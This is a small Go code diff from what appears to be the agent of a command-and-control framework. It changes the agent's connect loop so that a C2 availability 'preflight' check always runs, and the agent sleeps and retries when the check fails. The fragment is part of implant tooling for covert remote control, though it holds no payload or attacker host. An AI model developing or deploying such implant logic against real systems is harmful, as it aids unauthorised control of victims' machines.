@@ -168,14 +168,12 @@ func agent_main() {
 	isCheckedIn := false
 connect:
 	// check preset CC status URL, if CC is supposed to be offline, take a nap
-	if common.RuntimeConfig.CCIndicatorWaitMax > 0 &&
-		common.RuntimeConfig.CCIndicatorURL != "" { // check indicator URL or not
-		if !c2transport.CheckC2Condition(common.RuntimeConfig.C2TransportProxy) {
-			logging.Println("Conditional C2 check failed, signaling parent and sleeping")
-			conditionalC2FailNotify()
-			// if we return from the above, it means we are resumed
-			goto connect
-		}
+	// Preflight Check
+	if !c2transport.CheckC2Condition(common.RuntimeConfig.C2TransportProxy) {
+		logging.Println("Preflight check failed, signaling parent and sleeping")
+		conditionalC2FailNotify()
+		// if we return from the above, it means we are resumed
+		goto connect
 	}
 
 	// apply whatever proxy setting we have just added
